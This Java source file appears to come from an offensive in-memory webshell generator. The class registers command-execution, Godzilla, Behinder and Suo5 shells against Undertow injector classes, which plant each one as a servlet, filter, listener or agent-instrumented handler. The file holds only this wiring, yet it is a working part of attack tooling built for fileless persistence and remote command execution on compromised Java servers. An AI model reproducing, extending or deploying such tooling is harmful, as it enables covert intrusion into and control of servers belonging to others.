package com.reajason.javaweb.memshell;

import com.reajason.javaweb.memshell.shelltool.behinder.BehinderFilter;
import com.reajason.javaweb.memshell.shelltool.behinder.BehinderServlet;
import com.reajason.javaweb.memshell.shelltool.command.CommandFilter;
import com.reajason.javaweb.memshell.shelltool.command.CommandServlet;
import com.reajason.javaweb.memshell.shelltool.godzilla.GodzillaFilter;
import com.reajason.javaweb.memshell.shelltool.godzilla.GodzillaServlet;
import com.reajason.javaweb.memshell.shelltool.suo5.Suo5Filter;
import com.reajason.javaweb.memshell.shelltool.suo5.Suo5Servlet;
import com.reajason.javaweb.memshell.undertow.behinder.BehinderListener;
import com.reajason.javaweb.memshell.undertow.behinder.BehinderServletInitialHandlerAdvisor;
import com.reajason.javaweb.memshell.undertow.command.CommandListener;
import com.reajason.javaweb.memshell.undertow.command.CommandServletInitialHandlerAdvisor;
import com.reajason.javaweb.memshell.undertow.godzilla.GodzillaListener;
import com.reajason.javaweb.memshell.undertow.godzilla.GodzillaServletInitialHandlerAdvisor;
import com.reajason.javaweb.memshell.undertow.injector.UndertowFilterInjector;
import com.reajason.javaweb.memshell.undertow.injector.UndertowListenerInjector;
import com.reajason.javaweb.memshell.undertow.injector.UndertowServletInitialHandlerAgentInjector;
import com.reajason.javaweb.memshell.undertow.injector.UndertowServletInjector;
import com.reajason.javaweb.memshell.undertow.suo5.Suo5Listener;
import org.apache.commons.lang3.tuple.Pair;

import java.util.LinkedHashMap;
import java.util.Map;

import static com.reajason.javaweb.memshell.config.Constants.*;

/**
 * @author ReaJason
 * @since 2024/12/10
 */
public class UndertowShell extends AbstractShell {
    public static final String AGENT_SERVLET_HANDLER = AGENT + "ServletHandler";

    @Override
    protected Map<String, Pair<Class<?>, Class<?>>> getCommandShellMap() {
        Map<String, Pair<Class<?>, Class<?>>> map = new LinkedHashMap<>();
        map.put(SERVLET, Pair.of(CommandServlet.class, UndertowServletInjector.class));
        map.put(JAKARTA_SERVLET, Pair.of(CommandServlet.class, UndertowServletInjector.class));
        map.put(FILTER, Pair.of(CommandFilter.class, UndertowFilterInjector.class));
        map.put(JAKARTA_FILTER, Pair.of(CommandFilter.class, UndertowFilterInjector.class));
        map.put(LISTENER, Pair.of(CommandListener.class, UndertowListenerInjector.class));
        map.put(JAKARTA_LISTENER, Pair.of(CommandListener.class, UndertowListenerInjector.class));
        map.put(AGENT_SERVLET_HANDLER, Pair.of(CommandServletInitialHandlerAdvisor.class, UndertowServletInitialHandlerAgentInjector.class));
        return map;
    }

    @Override
    protected Map<String, Pair<Class<?>, Class<?>>> getGodzillaShellMap() {
        Map<String, Pair<Class<?>, Class<?>>> map = new LinkedHashMap<>();
        map.put(SERVLET, Pair.of(GodzillaServlet.class, UndertowServletInjector.class));
        map.put(JAKARTA_SERVLET, Pair.of(GodzillaServlet.class, UndertowServletInjector.class));
        map.put(FILTER, Pair.of(GodzillaFilter.class, UndertowFilterInjector.class));
        map.put(JAKARTA_FILTER, Pair.of(GodzillaFilter.class, UndertowFilterInjector.class));
        map.put(LISTENER, Pair.of(GodzillaListener.class, UndertowListenerInjector.class));
        map.put(JAKARTA_LISTENER, Pair.of(GodzillaListener.class, UndertowListenerInjector.class));
        map.put(AGENT_SERVLET_HANDLER, Pair.of(GodzillaServletInitialHandlerAdvisor.class, UndertowServletInitialHandlerAgentInjector.class));
        return map;
    }

    @Override
    protected Map<String, Pair<Class<?>, Class<?>>> getBehinderShellMap() {
        Map<String, Pair<Class<?>, Class<?>>> map = new LinkedHashMap<>();
        map.put(SERVLET, Pair.of(BehinderServlet.class, UndertowServletInjector.class));
        map.put(JAKARTA_SERVLET, Pair.of(BehinderServlet.class, UndertowServletInjector.class));
        map.put(FILTER, Pair.of(BehinderFilter.class, UndertowFilterInjector.class));
        map.put(JAKARTA_FILTER, Pair.of(BehinderFilter.class, UndertowFilterInjector.class));
        map.put(LISTENER, Pair.of(BehinderListener.class, UndertowListenerInjector.class));
        map.put(JAKARTA_LISTENER, Pair.of(BehinderListener.class, UndertowListenerInjector.class));
        map.put(AGENT_SERVLET_HANDLER, Pair.of(BehinderServletInitialHandlerAdvisor.class, UndertowServletInitialHandlerAgentInjector.class));
        return map;
    }

    @Override
    protected Map<String, Pair<Class<?>, Class<?>>> getSuo5ShellMap() {
        Map<String, Pair<Class<?>, Class<?>>> map = new LinkedHashMap<>();
        map.put(SERVLET, Pair.of(Suo5Servlet.class, UndertowServletInjector.class));
        map.put(JAKARTA_SERVLET, Pair.of(Suo5Servlet.class, UndertowServletInjector.class));
        map.put(FILTER, Pair.of(Suo5Filter.class, UndertowFilterInjector.class));
        map.put(JAKARTA_FILTER, Pair.of(Suo5Filter.class, UndertowFilterInjector.class));
        map.put(LISTENER, Pair.of(Suo5Listener.class, UndertowListenerInjector.class));
        map.put(JAKARTA_LISTENER, Pair.of(Suo5Listener.class, UndertowListenerInjector.class));
        return map;
    }
}
